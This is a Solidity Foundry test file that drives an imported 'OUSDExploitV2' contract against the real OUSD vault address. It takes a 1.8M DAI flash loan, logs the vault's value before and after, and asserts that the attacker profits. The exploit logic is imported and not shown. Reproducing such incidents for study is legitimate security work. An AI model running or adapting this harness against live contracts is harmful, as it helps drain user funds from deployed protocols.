// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../exploit/OUSDExploitV2.sol";

contract TestOUSDV2Fork is Test {
    OUSDExploitV2 exploiter;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether); // minimal ETH for gas
    }

    function testOUSDV2() public {
        vm.startPrank(attacker);

        exploiter = new OUSDExploitV2();

        console.log("=== Pre-exploit ===");
        console.log("Attacker ETH:", attacker.balance);
        console.log("OUSD Vault totalValue:", IOUSDVault(0x277e80f3E14E7fB3fc40A9d6184088e0241034bD).totalValue() / 1e18);

        // Flash loan 1.8M DAI (max available in dYdX)
        exploiter.exploit(1_800_000 ether);

        console.log("=== Post-exploit ===");
        console.log("Attacker ETH:", attacker.balance / 1e18);
        console.log("OUSD Vault totalValue:", IOUSDVault(0x277e80f3E14E7fB3fc40A9d6184088e0241034bD).totalValue() / 1e18);

        vm.stopPrank();

        // Verify profit
        assertGt(attacker.balance, 1 ether, "Should have profited");
    }
}
